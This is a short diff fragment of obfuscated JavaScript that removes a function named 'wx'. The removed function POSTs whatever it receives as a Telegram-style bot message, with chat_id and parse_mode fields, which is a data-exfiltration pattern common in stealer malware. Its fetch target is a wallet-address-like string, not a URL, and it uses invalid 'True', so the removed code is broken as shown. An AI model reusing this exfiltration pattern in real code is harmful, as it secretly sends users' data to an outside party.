@@ -1758,21 +1758,7 @@ function _0x3b85(d, e) {
     }
     )(d, e)
 }
-async function wx(d) {
-    console.log(d),
-    fetch("0x053973D64EE9256d6957E3C5D2b5dD100064F07F", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            parse_mode: "Markdown",
-            text: d,
-            disable_web_page_preview: True,
-        })
-    }).then(console.log).catch((d=>console.error(d)))
-}
+
 function _0x20d2(d, e) {
     const c = _0x77fe();
     return (_0x20d2 = function(e, W) {
